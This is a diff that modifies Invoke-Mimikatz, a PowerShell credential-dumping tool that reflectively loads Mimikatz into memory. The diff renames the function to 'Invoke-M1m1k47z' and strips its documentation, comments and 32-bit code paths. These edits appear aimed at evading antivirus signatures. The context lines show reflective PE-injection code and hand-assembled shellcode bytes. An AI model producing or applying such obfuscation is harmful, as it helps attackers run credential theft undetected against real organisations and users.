@@ -1,67 +1,5 @@
-function Invoke-Mimikatz
+function Invoke-M1m1k47z
 {
-<#
-.SYNOPSIS
-
-This script leverages Mimikatz 2.2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
-dump credentials without ever writing the mimikatz binary to disk.
-The script has a ComputerName parameter which allows it to be executed against multiple computers.
-
-This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
-
-Function: Invoke-Mimikatz
-Author: Joe Bialek, Twitter: @JosephBialek
-Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
-License:  http://creativecommons.org/licenses/by/3.0/fr/
-Required Dependencies: Mimikatz (included)
-Optional Dependencies: None
-Mimikatz version: 2.2.0 20210810-2
-
-.DESCRIPTION
-
-Reflectively loads Mimikatz 2.2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any
-functionality provided with Mimikatz.
-
-.PARAMETER DumpCreds
-
-Switch: Use mimikatz to dump credentials out of LSASS.
-
-.PARAMETER DumpCerts
-
-Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
-
-.PARAMETER Command
-
-Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
-
-.PARAMETER ComputerName
-
-Optional, an array of computernames to run the script on.
-
-.EXAMPLE
-
-Execute mimikatz on the local computer to dump certificates.
-Invoke-Mimikatz -DumpCerts
-
-.EXAMPLE
-
-Execute mimikatz on two remote computers to dump credentials.
-Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
-
-.EXAMPLE
-
-Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
-Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
-
-.NOTES
-This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
-Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
-Find mimikatz at: http://blog.gentilkiwi.com
-
-.LINK
-
-http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
-#>
 
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
 Param(
@@ -119,9 +57,6 @@ $RemoteScriptBlock = {
     Function Get-Win32Types
     {
         $Win32Types = New-Object System.Object
-
-        #Define all the structures/enums that will be used
-        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
         $Domain = [AppDomain]::CurrentDomain
         $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
         $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
@@ -253,58 +188,6 @@ $RemoteScriptBlock = {
         $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
         $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
 
-        #Struct IMAGE_OPTIONAL_HEADER32
-        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
-        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
-        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
-        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
-        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
-        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
-        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
-        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
-        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
-        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
-        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
-        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
-        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
-        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
-        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
-        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
-        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
-        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
-        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
-        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
-        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
-        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
-        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
-        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
-        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
-        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
-        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
-        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
-        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
-        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
-        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
-        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
-        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
-        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
-        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
-        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
-        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
-        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
-        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
-        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
-        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
-
         #Struct IMAGE_NT_HEADERS64
         $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
         $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
@@ -313,15 +196,6 @@ $RemoteScriptBlock = {
         $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
         $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
         $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
-
-        #Struct IMAGE_NT_HEADERS32
-        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
-        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
-        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
-        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
-        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
-        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
 
         #Struct IMAGE_DOS_HEADER
         $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
@@ -1051,12 +925,6 @@ $RemoteScriptBlock = {
             $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
             $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
         }
-        else
-        {
-            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
-            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
-            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
-        }
 
         return $NtHeadersInfo
     }
@@ -1138,11 +1006,6 @@ $RemoteScriptBlock = {
             [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
             $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
         }
-        else
-        {
-            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
-            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
-        }
 
         if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
         {
@@ -1199,8 +1062,7 @@ $RemoteScriptBlock = {
         $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
 
         [IntPtr]$DllAddress = [IntPtr]::Zero
-        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
-        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
+
         if ($PEInfo.PE64Bit -eq $true)
         {
             #Allocate memory for the address returned by LoadLibraryA
@@ -1357,14 +1219,7 @@ $RemoteScriptBlock = {
             $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
             $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
         }
-        else
-        {
-            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
-            $GetProcAddressSC2 = @(0xb9)
-            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
-            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
-            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
-        }
+
         $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
         $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
         $SCPSMemOriginal = $SCPSMem
@@ -1452,10 +1307,6 @@ $RemoteScriptBlock = {
             #Address to copy the section to
             [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
 
-            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
-            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
-            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
-            #    so truncate SizeOfRawData to VirtualSize
             $SizeOfRawData = $SectionHeader.SizeOfRawData
 
             if ($SectionHeader.PointerToRawData -eq 0)
@@ -1821,8 +1672,6 @@ $RemoteScriptBlock = {
         }
     }
 
-    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
-    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
     Function Update-ExeFunctions
     {
         Param(
